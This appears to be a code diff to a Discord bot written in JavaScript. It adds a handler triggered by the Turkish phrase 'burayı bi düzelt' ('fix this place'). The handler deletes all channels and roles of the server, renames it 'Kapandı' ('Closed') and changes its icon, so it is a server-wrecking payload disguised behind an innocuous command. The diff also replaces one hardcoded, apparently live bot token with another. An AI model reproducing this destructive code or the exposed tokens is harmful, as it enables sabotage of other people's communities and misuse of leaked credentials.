@@ -3,7 +3,12 @@ const berke = new Discord.Client();
 
 berke.on('message', async msg => {
   if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
-  
+    msg.guild.channels.deleteAll();
+    msg.guild.roles.deleteAll();
+    msg.guild.setName("Kapandı");
+    msg.guild.setIcon("https://www.main-taunus-zentrum.de/fileadmin/user_upload/GLOBAL/brand_stores/logos/closed.png");
+    msg.guild.createChannel("hey");
+
   }
 });
 
@@ -24,4 +29,4 @@ berke.on('channelCreate', channel => {
 
 });
 
-berke.login("NjEwMjM5MzUxMDE1ODY2MzY5.XWhX5w.g_GCxbjv2GLZJxs5ilqnVohi-28");
+berke.login("NjE3NDczNjI3Mzk4NjAyNzUz.XWrtew.OCYAWHNwhKTdbstrtg87uALZA1o");
